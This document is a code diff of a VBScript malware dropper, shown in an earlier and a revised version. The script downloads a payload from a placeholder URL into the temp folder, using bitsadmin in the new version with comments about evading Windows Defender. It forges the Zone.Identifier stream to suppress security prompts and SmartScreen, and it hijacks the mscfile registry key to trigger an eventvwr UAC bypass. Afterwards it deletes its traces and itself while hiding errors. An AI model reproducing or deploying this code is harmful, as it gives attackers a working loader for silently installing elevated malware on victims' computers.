@@ -1,118 +1,28 @@
 Sub Main()
+	'Global var holding temp dir 
+    tempdir = WScript.CreateObject("Scripting.FileSystemObject").GetSpecialFolder(2)
+	'Download our main bin using windows built in bitsadmin, to reduce code and bypass Windows Defender
 
-'Setting some vars
-
-fileurl = "[URL]"
-
-filename = WScript.CreateObject("Scripting.FileSystemObject").GetSpecialFolder(2) & "/[NAME]"
-
-
-
-'Download function
-
-dim shellobj 
-
-set shellobj = wscript.createobject("wscript.shell")
-
-set objhttpdownload = createobject("msxml2.xmlhttp" )
-
-objhttpdownload.open "get", fileurl, false
-
-objhttpdownload.send
-
-set objfsodownload = createobject ("scripting.filesystemobject")
-
-if  objfsodownload.fileexists (filename) then
-
-    objfsodownload.deletefile (filename)
-
-end if
-
- if objhttpdownload.status = 200 then
-
-   dim  objstreamdownload
-
-   set  objstreamdownload = createobject("adodb.stream")
-
-   with objstreamdownload
-
-        .type = 1 
-
-        .open
-
-        .write objhttpdownload.responsebody
-
-        .savetofile filename
-
-        .close
-
-   end with
-
-   set objstreamdownload = nothing
-
-end if
-
-
-'Set a new zoneid for the file to avoid windows "Are you sure??" "Security"
-''This is if the script is executed on a machine wihout admin priv(WIN10 patch 1607 or later, if it executes with admin priv, no message will be displayed anway
-''The same applies for smartscreen
-
-WScript.CreateObject("WScript.Shell").run("cmd.exe /C echo [zoneTransfer]ZoneID = 2 > """ + filename + """:ZONE.identifier"),0,true
-
-
-'UAC bypass/exploit setup
-
-Set WshShell = CreateObject("WScript.Shell")
-
-myKey = "HKCU\Software\Classes\mscfile\shell\open\command\"
-
-WshShell.RegWrite myKey,filename ,"REG_SZ"
-
-
-
-'UAC bypass/exploit trigger
-
-CreateObject("WScript.Shell").Run("eventvwr.exe"),0,true
-
-
-
-
-'UAC bypass/exploit cleanup
-
-Set objShell = Wscript.CreateObject("Wscript.Shell")
-
-objShell.RegDelete "HKCU\Software\Classes\mscfile\shell\open\command\"
-
-
-
-
-
-'Cleanup removal of this script after completed
-
-Set Cleanup = WScript.CreateObject("WScript.Shell")
-
-Cleanup.Run "cmd /c del %temp%\run.vbs", 0, True
-
-
-
-End Sub 
-
-
-
-'We dont want to display any errors
-
+    WScript.CreateObject("WScript.Shell").run("cmd /c bitsadmin /transfer myDownloadJob /download /priority FOREGROUND [URL] %temp%/[NAME]"),0,true
+	'Lets set our zoneid to 2
+    WScript.CreateObject("WScript.Shell").run("cmd.exe /C echo [zoneTransfer]ZoneID = 2 > " + tempdir + "\[NAME]:ZONE.identifier"),0,true
+ 	'Setup the reg-key for UAC bypass
+    CreateObject("WScript.Shell").RegWrite "HKCU\Software\Classes\mscfile\shell\open\command\", tempdir +"\[NAME]" ,"REG_SZ"
+ 	'Trigger the bypass
+    CreateObject("WScript.Shell").Run("eventvwr.exe"),0,true
+ 	'Cleanup after bypass
+    Wscript.CreateObject("Wscript.Shell").RegDelete "HKCU\Software\Classes\mscfile\shell\open\command\"
+ 	'Cleanup after this script
+    WScript.CreateObject("WScript.Shell").Run "cmd /c del %temp%\"  + WScript.ScriptName, 0, True
+ 
+End Sub
+ 'We don't wanna show any errors
 On Error Resume Next
-
+ 
   Main
-
+ 
   If Err.Number Then
-
      'on error cleanup and exit
-
-     set Cleanup = WScript.CreateObject("WScript.Shell")
-
-     Cleanup.Run "cmd /c del %temp%\run.vbs", 0, True
-
+     WScript.CreateObject("WScript.Shell").Run "cmd /c del %temp%\"  + WScript.ScriptName, 0, True
      WScript.Quit 4711
-
 End If
